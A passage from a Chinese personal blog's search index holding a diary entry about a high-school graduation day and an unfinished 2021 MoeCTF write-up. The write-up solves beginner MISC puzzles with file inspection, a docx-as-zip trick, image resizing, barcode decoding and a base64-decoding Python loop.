        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="学校"><a href="#学校" class="headerlink" title="学校"></a>学校</h2><p>7月6日，学校统一组织高三毕业学生返校领取毕业证。借此机会，班上组织了高三最后一次也是第一次（bushi）的团建活动。破天荒提前到了（笑）</p><p>  没多久便是规定集合时间，前方传来班主任的声音，我抬头，讲台上的老师正催促着大家联系一位迟到的同学，一切似乎与平时并无二致，唯一不同的是我没迟到（笑）                                                    好在那位同学很快就来到班上，老师也开始了最后的讲话。我收起了手机，目光转移到老师身上，许多同学也做着和我一样的动作，大家都很珍惜最后一次被老师念叨，这种默契是蝉噪无法穿透的。可惜的是，这一次，她没再说上好几分钟。</p><h2 id="周边-便利店"><a href="#周边-便利店" class="headerlink" title="周边(便利店)"></a>周边(便利店)</h2><p>   一进店，和我熟识的阿姨就问起了我的去向，我答道：”去西安念大学。“ ”西安？这么远啊！“她发出了和我家人一样的惊呼。我不知道该说什么，只是往里走拿了一瓶水，出来结账时，阿姨说：”这是你最后一次来了吧，下一次你来都要好几年后了。”几年后都不一定……“  我心里叹着，走出了店。           校外的街道,蝉声似乎更加烦躁，烈日也变得愈发灼人，我喝了一口刚买的冰水。</p><p>前去聚餐地点半路，忽然想起还要去拿快递，于是改道.  </p><h2 id="周边-驿站"><a href="#周边-驿站" class="headerlink" title="周边(驿站)"></a>周边(驿站)</h2><p>那家菜鸟驿站还是老样子，我推开门进去，老板还是那么热心，一看到我就掏出了早已准备好的快递，”雨飘的是吧，过期好几天都没来取，我给你收好了。“ 我接过快递，随口说：”这应该是我最后一次来拿快递了。“ ”为啥啊？“他问。”因为我考完了“ ”上哪个大学啊？“ ”XXXXXX大学“我答道。”这大学不错！“老板盛赞。我笑笑,和老板道别,走出了驿站，天突然凉了下来，蝉声也没那么扰人了.</p><h2 id="班级聚餐＆KTV"><a href="#班级聚餐＆KTV" class="headerlink" title="班级聚餐＆KTV"></a>班级聚餐＆KTV</h2><p>​                                                这一段貌似当初就没写,那我继续空着了()</p><h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p> 走出生源大门，抄近道来到距家最后一个十字路口， 孤立在红绿灯旁。迎面洒下的是万丈光辉，来往的车辆和行人身上闪烁着点点金光。信号转绿，我迈步沿着人行道走去，与上一秒还贴得很近的人们分别，错过。我想起了最后一课上班主任的嘱托：“祝贺你们进入了人生的新阶段。”</p><p>  是的，每个人的人生就像一条不断变化的道路，在某时某刻， 一群人的道路发生了交汇，各自产生了交集，互相影响了对方的未来。但随着时间推移，那群人之中的老师也好，同学也罢，每个人的道路终将四散开来，再与新的一群人发生交汇，再分离…..</p><p>  我希望，大家都能够向过去告别，朝未来出发。在永不停息的聚散之中， 延展出属于自己的未来。</p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 回忆 感想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 MoeCTF WP By whocansee</title>
      <link href="/2021/09/26/MoeCTF-2021-WP-BY-whocansee/"/>
      <url>/2021/09/26/MoeCTF-2021-WP-BY-whocansee/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><blockquote><p>本人其它方向水平实在有限,这次就先写MISC类吧</p></blockquote><ul><li><p>find_me</p><p>​    签到题,把题目给的文件放进010editor里搜一下ctf就可以了</p></li><li><p>Macross</p><p>​    必应搜索题给文件后缀名,发现属于宏脚本文件,下载对应的程序,把文件放进去运行即得flag    </p></li><li><p>Homework</p><p>​    题目给的是word文档,我拿到后打开,发现了歌颂网络安全的一大段文字,尝试打开了隐藏文字</p><p>​    啥也看不见,咋回事?  后来查资料发现隐藏文字在<strong>白色背景</strong>下显示不出来,所以打开了<strong>护眼背景</strong></p><p>​    顺利发现一处异常,试着复制下来粘贴在Notepad上,找到<strong>一截</strong>flag</p><p><a href="https://imgtu.com/i/4clxx0"><img src="https://z3.ax1x.com/2021/09/26/4clxx0.png" alt="4clxx0.png" loading="lazy"></a></p></li></ul><p><a href="https://imgtu.com/i/4c1PZF"><img src="https://z3.ax1x.com/2021/09/26/4c1PZF.png" alt="4c1PZF.png" loading="lazy"></a></p><blockquote><p>​    没错,真的是**<u>一截</u>**</p></blockquote><p>从这里开始就陷入怪圈了,忙活了许久也没发现答案,遂暂时放下   </p><p>后来知识(<del>套路</del>)增进以后想到会不会是文档包含了其它的东西,于是拖进010editor中分析,发现文件头是zip的50 4B 03 04,于是改后缀名为zip解压缩</p><blockquote><p>这时我还不会用Kali = =</p></blockquote><p><a href="https://imgtu.com/i/4c1ia4"><img src="https://z3.ax1x.com/2021/09/26/4c1ia4.png" alt="4c1ia4.png" loading="lazy"></a></p><p>得到这些东西,每个文件夹都看了一遍,一时也没想出下一步咋办</p><p>后来偶然看到一篇WP,里面的做法是打开word文件夹内的documents.xml文件,搜索flag,得到了答案</p><p>我照做,但并没有直接得到flag</p><p><a href="https://imgtu.com/i/4clv2q"><img src="https://z3.ax1x.com/2021/09/26/4clv2q.png" alt="4clv2q.png" loading="lazy"></a>            根据xml的特点,查找w:t  将符合格式的字符串多次拼接后得到最终flag</p><blockquote><p>PS:我到最后仍未理解Hint中的字数不够和隐藏文字有啥联系(因为隐藏文字不算word字数)</p></blockquote><ul><li><p>flipflipflip</p><p>​    分析题目后,整了个导图</p><p>​    <img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20211006163140530.png" alt="image-20211006163140530" loading="lazy"></p><p>​    等到操作起来,发现真正卡壳的地方完全不在图上…….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\who&#x27;can&#x27;se&#x27;e\Desktop\CTF\TASK\task.txt&quot;</span>).read().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">m = <span class="string">&quot;moectf&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> <span class="built_in">str</span>(s, encoding=<span class="string">&#x27;utf-8&#x27;</span>).startswith(m):</span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">        s=base64.b64decode(s)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line">        s = s[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;answer.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="built_in">str</span>(s,<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ok!&quot;</span>)</span><br></pre></td></tr></table></figure><p>这是我改进许久后的一段代码,但仍然在输出文本为700多K大小时进行不下去了,以下是报错代码</p><p><img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20211006163712648.png" alt="image-20211006163712648" loading="lazy"></p><p>查资料<img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20211006163910694.png" alt="image-20211006163910694" loading="lazy"></p><p><img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20211006164207282.png" alt="image-20211006164207282" loading="lazy"></p><p>但我用的就是UTF-8啊,这咋办?</p></li><li><p>white album</p><blockquote><p>​    又是白色相簿的季节~</p></blockquote><p>打开图片,发现是white album galgame的插图,没看出什么玄机,于是拿StegSolve试试,结果左右摁了半天都没发现异样</p><p>看了一些WP后察觉到可能是宽高被修改过的问题,于是拿出010Editor查看,发现宽高果然不一样,修改后得到完整图片</p><p>下面多了一截二维条码,然而当时无知的我还以为是二维码的五个部分,于是臆想五部分＋三个角＋一个地方随便放</p><p>拼接成二维码,歪歪扭扭的裁剪下来后发现了一个严重的问题:拼接顺序,后无法解决,询问Noah学长后得知没有这么复杂</p><blockquote><p>​    错误的灵感来自于某些中间部分拿图标挡住的商业二维码</p></blockquote><p>卡壳后不死心,拿支付宝扫了下这个码,出乎意料的是竟然能扫描,但呈现出来的页面是”您的彩票失效了”,查找关键字发现</p><p>这意味着解码错误,我忽然间想到会不会是这个码非常特殊,支付宝用了解析别的码的方式解析它导致出错,说干就干,我查</p><p>了常见二维条码,功夫不负有心人,最终发现了此类条码的名字,随后花费半小时找到对应的解码工具,拿到Flag~</p></li><li><p>Phone Call</p><blockquote><p>​    题目的简介把我逗乐了,笑了好一会儿</p></blockquote><p>题目的意思还是比较明确的,要求把拨号声转换为真实的号码,我搜索关键字后得到了许多原理剖析文章,但我要的不是这个,</p><p>而是现成能用的工具———————————–</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc 解题报告 CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
